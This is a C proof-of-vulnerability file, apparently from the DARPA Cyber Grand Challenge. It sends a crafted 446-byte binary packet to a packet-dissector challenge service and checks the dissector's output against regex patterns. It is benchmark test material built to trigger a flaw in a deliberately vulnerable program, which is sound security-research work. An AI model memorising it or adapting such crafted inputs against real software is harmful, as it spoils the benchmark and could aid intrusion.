#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xbe\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\x9e\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\x9e\x01\x00\x00"
         "\x02\x05\xfc\x6c\xca\x11\xa2\xa4\x12\xa9\xed\x3b\x79\xe9\xdd\x98"
         "\x82\x18\xa9\x6a\x04\x00\x00\x00\x13\x8c\xbb\x7b\x0e\x29\x24\x8e"
         "\x41\x00\xd6\x0f\xa2\x29\xd3\x07\x01\x64\x01\x31\xa6\x05\x76\x90"
         "\x02\xb0\x1d\x63\x57\x01\x11\x2d\x21\xdd\x00\xc5\x9f\xc6\x1d\x56"
         "\xa3\x07\x66\xd9\x19\x1f\x65\x6b\x8a\xd9\xa3\x63\x8b\x72\xdf\xb3"
         "\x33\x3e\x6f\xff\xc9\xe1\xd6\x15\x91\xe9\xc7\xcd\x82\xbd\xa8\x9b"
         "\xaa\x54\x41\x00\xca\x7d\xd0\x20\x94\xc5\x37\xb6\x41\x00\x3c\x41"
         "\x01\x00\xf1\xff\xc0\x3b\x3c\x84\xfb\x30\xc4\x63\x97\x77\x3a\x1b"
         "\x7c\x62\x7c\x3c\x35\xf3\x4c\xf0\xee\xa5\xa6\x37\x1f\xa8\xae\xa2"
         "\xe6\x19\x35\x3a\x95\x12\xef\x13\x23\x49\xbd\x73\x7d\x1d\x18\x29"
         "\xb6\x33\x8b\xef\xaf\xdf\xad\x3f\x4a\xe5\x63\x24\xc9\x28\x01\xbe"
         "\xf0\x1c\xce\x09\x23\xd1\xf4\xf7\x2b\x65\xd4\x49\x9d\xce\xd2\xd1"
         "\x1b\xcb\x5b\xab\x74\x68\x2d\x00\xb5\x3e\x43\xd2\xc0\x44\x75\xbb"
         "\x3e\x50\x30\x64\xa9\xc0\x3a\xdc\xbb\x81\xfc\x94\x75\x78\xc2\x38"
         "\x45\x90\x88\x7f\x15\x65\x78\xdf\x64\x7c\xa1\x71\xbb\x0b\xcc\xf8"
         "\xe4\x01\x4d\xd9\xa3\x5d\x52\xe3\xd1\x13\xfb\x46\xb8\x6b\x2c\xb2"
         "\x2a\x33\xa0\x44\x54\x9d\x7c\x79\xcb\x46\x97\xa8\xbe\xd3\x39\x10"
         "\x93\xbc\x56\x15\xc5\x04\x2a\x2c\x20\x96\x11\x51\xdd\x3a\xf8\x26"
         "\x7e\x96\x0d\x98\xbe\xe7\xb4\xf8\xf1\x73\x5f\x70\xee\x39\xd6\x1e"
         "\x94\x6a\x3b\x11\x10\x69\xc7\x99\x9c\x71\xc1\x5c\xd4\x20\x12\x57"
         "\x3c\x0f\xb8\xf0\xf2\x92\xbd\x0e\x65\xc9\xe9\x60\x0a\xdf\xdd\x70"
         "\xca\xe0\x3f\x82\x6f\x4f\x23\xd9\x2c\x3f\x87\x7b\x21\x4f\xf2\xb0"
         "\xb8\x24\x9b\x74\x22\x21\x38\x1f\x59\x95\xcb\xfa\xae\xef\xe8\x2f"
         "\xb0\x84\x4d\xf7\xb0\x81\xb1\x7f\x01\x46\x41\x00\x41\x00\x3f\xa3"
         "\xc1\xcd\x23\xa2\xd1\x9b\xfb\xb1\x0e\xb1\x51\xfd\xda\x53\xdc\x86"
         "\xfa\x98\x55\x77\x76\x2d\xbc\x41\x08\xa9\xb8\x9d\xc8\x81";
      static unsigned int write_00001_00000_len = 446;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamaisonymy
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x69\x73\x6f\x6e\x79\x6d"
         "\x79";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
